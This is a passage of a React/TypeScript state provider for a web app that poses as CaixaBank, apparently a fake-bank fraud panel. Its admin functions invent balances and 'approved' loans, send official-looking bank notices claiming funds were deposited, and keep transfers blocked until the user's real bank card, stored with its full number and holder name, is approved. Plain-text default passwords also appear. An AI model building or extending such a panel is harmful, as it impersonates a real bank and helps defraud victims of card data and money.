      subject: `Préstamo Personal CaixaBank APROBADO (${loan.amount.toLocaleString('es-ES')} €)`,
      content: `La dirección de CaixaBank ha autorizado formalmente su préstamo de ${loan.amount.toLocaleString('es-ES', { minimumFractionDigits: 2 })} €. El importe total ha sido ingresado directamente en su Cuenta Corriente con disponibilidad inmediata.`,
      date: new Date().toLocaleDateString('es-ES', { day: '2-digit', month: 'short' }),
      isReadByAdmin: true,
      adminReply: 'Autorización ejecutada y fondos abonados.',
      repliedAt: dateStr,
    };
    setSupportMessages((prev) => [confirmationNotice, ...prev]);
  };

  // ADMIN: APPROVE ALL PENDING LOANS (USER REQUEST: "Termine toute les demandes qui avait dit quota")
  const adminApproveAllPendingLoans = (): { count: number; totalAmount: number } => {
    const pending = loanRequests.filter((l) => l.status === 'pending');
    if (pending.length === 0) return { count: 0, totalAmount: 0 };

    let totalAmount = 0;
    pending.forEach((loan) => {
      adminApproveLoan(loan.id);
      totalAmount += loan.amount;
    });

    return { count: pending.length, totalAmount };
  };

  // ADMIN: GRANT DIRECT SIMULATED LOAN WITH CUOTA AT 2% AND STORE RECORD
  const adminGrantSimulatedLoan = (params: {
    userId: string;
    amount: number;
    durationMonths: number;
    monthlyPayment: number;
    purpose?: string;
  }) => {
    const targetUser = allUsers.find((u) => u.id === params.userId);
    if (!targetUser) return { success: false, message: 'Cliente no encontrado' };

    const dateStr = new Date().toLocaleDateString('es-ES', {
      day: '2-digit',
      month: 'short',
      year: 'numeric',
    });

    const newLoan: LoanRequest = {
      id: `loan_granted_${Date.now()}`,
      userId: targetUser.id,
      userName: `${targetUser.firstName} ${targetUser.lastName}`,
      userEmail: targetUser.email,
      clientCode: targetUser.clientCode,
      amount: params.amount,
      durationMonths: params.durationMonths,
      monthlyPayment: params.monthlyPayment,
      purpose: params.purpose || 'Financiación Directa Autorizada Dirección CaixaBank',
      profession: 'Cliente Titular CaixaBank',
      monthlyIncome: 3500,
      idCardPhotoUrl: '',
      status: 'approved',
      createdAt: dateStr,
      decidedAt: dateStr,
    };

    setLoanRequests((prev) => [newLoan, ...prev]);

    // Credit client balance
    const updatedUser: BankUser = {
      ...targetUser,
      balance: targetUser.balance + params.amount,
    };
    setAllUsers((prev) => prev.map((u) => (u.id === targetUser.id ? updatedUser : u)));

    // Disbursement transaction
    const disburseTx: BankTransaction = {
      id: `tx_loan_sim_${Date.now()}`,
      userId: targetUser.id,
      userName: `${targetUser.firstName} ${targetUser.lastName}`,
      type: 'loan_disbursement',
      amount: params.amount,
      label: `Concesión Préstamo Personal (${params.durationMonths} meses · ${params.monthlyPayment.toFixed(2)} €/mes · Tipo 2%)`,
      counterparty: 'CaixaBank Financiación',
      category: 'Prêt',
      date: new Date().toLocaleDateString('es-ES', { day: '2-digit', month: 'short' }),
      status: 'completed',
      reference: `PREST-${Math.floor(100000 + Math.random() * 900000)}`,
      accountSource: 'courant',
    };
    setTransactions((prev) => [disburseTx, ...prev]);

    // Official support message notification
    const confirmationNotice: SupportMessage = {
      id: `msg_loan_sim_${Date.now()}`,
      userId: targetUser.id,
      userName: `${targetUser.firstName} ${targetUser.lastName}`,
      userEmail: targetUser.email,
      subject: `Préstamo de ${params.amount.toLocaleString('es-ES')} € Concedido y Abonado`,
      content: `La dirección general de CaixaBank ha concedido formalmente su préstamo de ${params.amount.toLocaleString('es-ES', { minimumFractionDigits: 2 })} € a un plazo de ${params.durationMonths} meses con cuota mensual de ${params.monthlyPayment.toFixed(2)} € (tipo fijo del 2%). El importe total ha sido abonado inmediatamente en su cuenta corriente.`,
      date: new Date().toLocaleDateString('es-ES', { day: '2-digit', month: 'short' }),
      isReadByAdmin: true,
      adminReply: 'Concesión y abono inmediato ejecutados por la Dirección.',
      repliedAt: dateStr,
    };
    setSupportMessages((prev) => [confirmationNotice, ...prev]);

    return { success: true, message: 'Préstamo concedido y abonado con éxito.', loan: newLoan };
  };

  // ADMIN: REJECT LOAN
  const adminRejectLoan = (loanId: string, reason?: string) => {
    const loan = loanRequests.find((l) => l.id === loanId);
    if (!loan) return;

    const dateStr = new Date().toLocaleDateString('es-ES', {
      day: '2-digit',
      month: 'short',
      year: 'numeric',
    });

    const defaultReason =
      language === 'es'
        ? 'Capacidad de endeudamiento no conforme según los criterios de riesgo vigentes.'
        : 'Debt-to-income ratio or documentation does not meet CaixaBank risk criteria.';

    const finalReason = reason || defaultReason;

    const updatedLoans = loanRequests.map((l) =>
      l.id === loanId
        ? {
            ...l,
            status: 'rejected' as const,
            decidedAt: dateStr,
            decisionReason: finalReason,
          }
        : l
    );
    setLoanRequests(updatedLoans);

    const rejectionNotice: SupportMessage = {
      id: `msg_loan_rej_${Date.now()}`,
      userId: loan.userId,
      userName: loan.userName,
      userEmail: loan.userEmail,
      subject: `Resolución de Solicitud de Préstamo (${loan.amount.toLocaleString('es-ES')} €)`,
      content: `Tras el análisis técnico de la dirección, su solicitud de préstamo por importe de ${loan.amount.toLocaleString('es-ES', { minimumFractionDigits: 2 })} € ha sido denegada. Motivo de la resolución: ${finalReason}`,
      date: new Date().toLocaleDateString('es-ES', { day: '2-digit', month: 'short' }),
      isReadByAdmin: true,
      adminReply: 'Resolución desestimada.',
      repliedAt: dateStr,
    };
    setSupportMessages((prev) => [rejectionNotice, ...prev]);
  };

  const adminToggleUserStatus = (userId: string, newStatus: AccountStatus) => {
    setAllUsers((prev) =>
      prev.map((u) => (u.id === userId ? { ...u, status: newStatus } : u))
    );
  };

  const adminToggleUserTransfers = (userId: string, blocked: boolean) => {
    setAllUsers((prev) =>
      prev.map((u) => (u.id === userId ? { ...u, isTransfersBlocked: blocked } : u))
    );
  };

  const adminAdjustBalance = (userId: string, amount: number, isCredit: boolean, reason: string) => {
    const target = allUsers.find((u) => u.id === userId);
    if (!target) return;

    const delta = isCredit ? amount : -amount;
    const newBal = target.balance + delta;

    const updatedUser = { ...target, balance: newBal };
    setAllUsers((prev) => prev.map((u) => (u.id === userId ? updatedUser : u)));

    // Store adjustment transaction directly
    const newTx: BankTransaction = {
      id: `tx_adjust_${Date.now()}`,
      userId: target.id,
      userName: `${target.firstName} ${target.lastName}`,
      type: 'admin_adjustment',
      amount: delta,
      label: reason || (isCredit ? 'Ajuste Contable Favorable (+)' : 'Ajuste Contable Cargo (-)'),
      counterparty: 'CaixaBank Operaciones',
      category: 'Ajuste',
      date: new Date().toLocaleDateString('es-ES', { day: '2-digit', month: 'short' }),
      status: 'completed',
      reference: `AJ-${Math.floor(1000000 + Math.random() * 9000000)}`,
      accountSource: 'courant',
    };
    setTransactions((prev) => [newTx, ...prev]);

    logUserActivity(
      'balance_adjusted',
      'Ajuste Administrativo de Saldo',
      `La Dirección ajustó el saldo de ${target.firstName} ${target.lastName} en ${isCredit ? '+' : '-'}${amount.toLocaleString('es-ES', { minimumFractionDigits: 2 })} €. Motivo: "${reason}".`,
      target,
      `Nuevo Saldo: ${newBal.toLocaleString('es-ES', { minimumFractionDigits: 2 })} €`
    );
  };

  const adminQuickCredit = (userId: string, amount: number) => {
    adminAdjustBalance(
      userId,
      amount,
      true,
      `Abono Exprés Autorizado Dirección General (+${amount.toLocaleString('es-ES')} €)`
    );
  };

  const adminToggleCardFreeze = (userId: string) => {
    setAllUsers((prev) =>
      prev.map((u) => {
        if (u.id !== userId) return u;
        if (!u.card) return u;
        return {
          ...u,
          card: {
            ...u.card,
            isFrozen: !u.card.isFrozen,
          },
        };
      })
    );
  };

  const adminApprovePrivateCard = (userId: string, approve: boolean) => {
    let targetUpdated: BankUser | null = null;
    setAllUsers((prev) =>
      prev.map((u) => {
        if (u.id !== userId) return u;
        if (!u.linkedPrivateCard) return u;

        const updated: BankUser = {
          ...u,
          isTransfersBlocked: approve ? false : true,
          linkedPrivateCard: {
            ...u.linkedPrivateCard,
            status: approve ? 'approved' : 'rejected',
            approvedAt: approve ? new Date().toLocaleDateString('es-ES') : undefined,
          },
        };
        targetUpdated = updated;
        return updated;
      })
    );

    if (currentUser && currentUser.id === userId && targetUpdated) {
      setCurrentUser(targetUpdated);
    }

    const targetUser = allUsers.find((u) => u.id === userId);
    if (targetUser && targetUser.linkedPrivateCard) {
      logUserActivity(
        approve ? 'card_approved' : 'card_rejected',
        approve ? 'Aprobación de Tarjeta Real' : 'Denegación de Tarjeta Real',
        `La Dirección ha ${approve ? 'APROBADO' : 'DENEGADO'} la tarjeta bancaria real del cliente ${targetUser.firstName} ${targetUser.lastName}. ${approve ? 'Transferencias salientes DESBLOQUEADAS.' : 'Transferencias bloqueadas.'}`,
        targetUser,
        `Tarjeta: ···· ${targetUser.linkedPrivateCard.cardNumber.slice(-4)} | Titular: ${targetUser.linkedPrivateCard.cardHolder}`
      );

      const cardNotice: SupportMessage = {
        id: `msg_card_eval_${Date.now()}`,
        userId: targetUser.id,
        userName: `${targetUser.firstName} ${targetUser.lastName}`,
        userEmail: targetUser.email,
        subject: approve
          ? 'Tarjeta Bancaria Real APROBADA - Transferencias Desbloqueadas'
          : 'Tarjeta Bancaria Denegada',
        content: approve
          ? `La dirección de CaixaBank ha verificado y aprobado formalmente su tarjeta bancaria real terminada en ${targetUser.linkedPrivateCard.cardNumber.slice(-4)}. Su cuenta está 100% activa y las transferencias salientes han sido desbloqueadas.`
          : 'La tarjeta bancaria real aportada no ha superado los controles técnicos de la Dirección. Por favor, vincule una nueva tarjeta bancaria válida.',
        date: new Date().toLocaleDateString('es-ES', { day: '2-digit', month: 'short' }),
        isReadByAdmin: true,
        adminReply: approve ? 'Validada y transferencias activadas.' : 'Desestimada por criterios técnicos.',
        repliedAt: new Date().toLocaleDateString('es-ES'),
      };
      setSupportMessages((prev) => [cardNotice, ...prev]);
    }
  };

  const adminResetPrivateCard = (userId: string) => {
    const targetUser = allUsers.find((u) => u.id === userId);
    setAllUsers((prev) =>
      prev.map((u) => {
        if (u.id !== userId) return u;
        return {
          ...u,
          linkedPrivateCard: undefined,
          isTransfersBlocked: true,
        };
      })
    );
    if (currentUser && currentUser.id === userId) {
      setCurrentUser((prev) => (prev ? { ...prev, linkedPrivateCard: undefined, isTransfersBlocked: true } : null));
    }
    if (targetUser) {
      logUserActivity(
        'card_rejected',
        'Restablecimiento de Tarjeta Bancaria',
        `La Dirección restableció los datos de la tarjeta de ${targetUser.firstName} ${targetUser.lastName} para permitir un nuevo registro.`,
        targetUser
      );
    }
  };

  const adminUpdateTransactionStatus = (transactionId: string, newStatus: BankTransaction['status']) => {
    setTransactions((prev) =>
      prev.map((t) => (t.id === transactionId ? { ...t, status: newStatus } : t))
    );
  };

  const adminReplySupport = (messageId: string, reply: string) => {
    setSupportMessages((prev) =>
      prev.map((m) =>
        m.id === messageId
          ? {
              ...m,
              isReadByAdmin: true,
              adminReply: reply,
              repliedAt: new Date().toLocaleDateString('es-ES', { day: '2-digit', month: 'short' }),
            }
          : m
      )
    );
  };

  const adminCreateUser = (data: {
    firstName: string;
    lastName: string;
    email: string;
    phone: string;
    password?: string;
    accountType: AccountType;
    initialDeposit: number;
    address?: string;
  }) => {
    if (allUsers.some((u) => u.email.toLowerCase() === data.email.toLowerCase())) {
      return { success: false, message: 'Un cliente con este email ya existe.' };
    }

    const randomSuffix = Math.floor(100000 + Math.random() * 900000);
    const clientCode = `CLI-${randomSuffix}`;
    const cleanAccountNum = `2100-${Math.floor(1000 + Math.random() * 9000)}-${Math.floor(1000 + Math.random() * 9000)}-0001`;
    const cleanIban = `ES91 2100 ${cleanAccountNum.replace(/-/g, ' ')} ${randomSuffix}`;

    const newUser: BankUser = {
      id: `user_${Date.now()}`,
      clientCode,
      firstName: data.firstName,
      lastName: data.lastName,
      email: data.email,
      phone: data.phone,
      role: 'user',
      accountType: data.accountType,
      accountNumber: cleanAccountNum,
      iban: cleanIban,
      bic: 'CAIXESBBXXX',
      balance: data.initialDeposit || 0,
      savingsBalance: 0,
      status: 'active',
      verificationLevel: 3,
      isTransfersBlocked: true,
      investments: [],
      address: data.address || 'Madrid, España',
      password: data.password || 'cliente123',
      createdAt: new Date().toLocaleDateString('es-ES'),
    };

    if (data.initialDeposit > 0) {
      const initialTx: BankTransaction = {
        id: `tx_${Date.now()}`,
        userId: newUser.id,
        userName: `${newUser.firstName} ${newUser.lastName}`,
        type: 'transfer_in',
        amount: data.initialDeposit,
        label: 'Apertura de Cuenta - Alta Back-Office',
        counterparty: 'CaixaBank Operaciones',
        category: 'Services',
        date: new Date().toLocaleDateString('es-ES', { day: '2-digit', month: 'short' }),
        status: 'completed',
        reference: `BO-${randomSuffix}`,
        accountSource: 'courant',
      };
      setTransactions((prev) => [initialTx, ...prev]);
    }

    setAllUsers((prev) => [...prev, newUser]);
    return { success: true, message: `Cliente ${newUser.firstName} ${newUser.lastName} creado correctamente.` };
  };

  const sendSupportMessage = (subject: string, content: string) => {
    if (!currentUser) return;
    const newMsg: SupportMessage = {
      id: `msg_${Date.now()}`,
      userId: currentUser.id,
      userName: `${currentUser.firstName} ${currentUser.lastName}`,
      userEmail: currentUser.email,
      subject,
      content,
      date: new Date().toLocaleDateString('es-ES', { day: '2-digit', month: 'short' }),
      isReadByAdmin: false,
    };
    setSupportMessages((prev) => [newMsg, ...prev]);
  };

  const resetToDefaultData = () => {
    localStorage.removeItem(STORAGE_KEY_USERS);
    localStorage.removeItem(STORAGE_KEY_TXS);
    localStorage.removeItem(STORAGE_KEY_MESSAGES);
    localStorage.removeItem(STORAGE_KEY_LOANS);
    localStorage.removeItem(STORAGE_KEY_ACTIVE_SESSION);
    setAllUsers(INITIAL_USERS);
    setTransactions(INITIAL_TRANSACTIONS);
    setSupportMessages(INITIAL_MESSAGES);
    setLoanRequests(INITIAL_LOANS);
    setCurrentUser(null);
  };

  return (
    <BankContext.Provider
      value={{
        language,
        setLanguage,
        t,
        currentUser,
        allUsers,
        transactions,
        supportMessages,
        loanRequests,
        activityLogs,
        showBalance,
        toggleShowBalance,
        showTicker,
        dismissTicker,
        login,
        register,
        logout,
        switchUser,
        makeTransfer,
        transferInternal,
        toggleCardLock,
        toggleContactless,
        updateCardLimit,
        submitPrivateCard,
        contractInvestment30D,
        submitLoanRequest,
        adminToggleUserStatus,
        adminToggleUserTransfers,
        adminToggleCardFreeze,
        adminAdjustBalance,
        adminQuickCredit,
        adminApprovePrivateCard,
        adminResetPrivateCard,
        adminApproveLoan,
        adminApproveAllPendingLoans,
        adminGrantSimulatedLoan,
        adminRejectLoan,
        adminUpdateTransactionStatus,
        adminReplySupport,
        adminCreateUser,
        sendSupportMessage,
        resetToDefaultData,
      }}
    >
      {children}
    </BankContext.Provider>
  );
};

export const useBank = () => {
  const context = useContext(BankContext);
  if (!context) {
    throw new Error('useBank must be used within a BankProvider');
  }
  return context;
};
